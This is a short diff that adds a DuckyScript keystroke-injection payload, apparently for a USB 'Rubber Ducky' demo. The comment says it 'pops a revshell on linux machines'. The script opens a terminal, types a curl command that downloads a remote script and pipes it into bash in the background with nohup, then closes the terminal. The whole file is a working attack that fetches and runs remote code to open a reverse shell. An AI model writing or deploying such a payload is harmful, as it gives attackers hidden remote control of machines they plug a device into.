@@ -1,0 +1,15 @@
+REM pops a revshell on linux machines
+
+GUI ENTER
+
+DELAY 250
+
+STRING curl -s https://raw.githubusercontent.com/cyb3rjerry/ducky-demo/main/revshell.sh | nohup bash -s &
+DELAY 100
+ENTER
+DELAY 100
+
+
+STRING exit
+DELAY 100
+ENTER
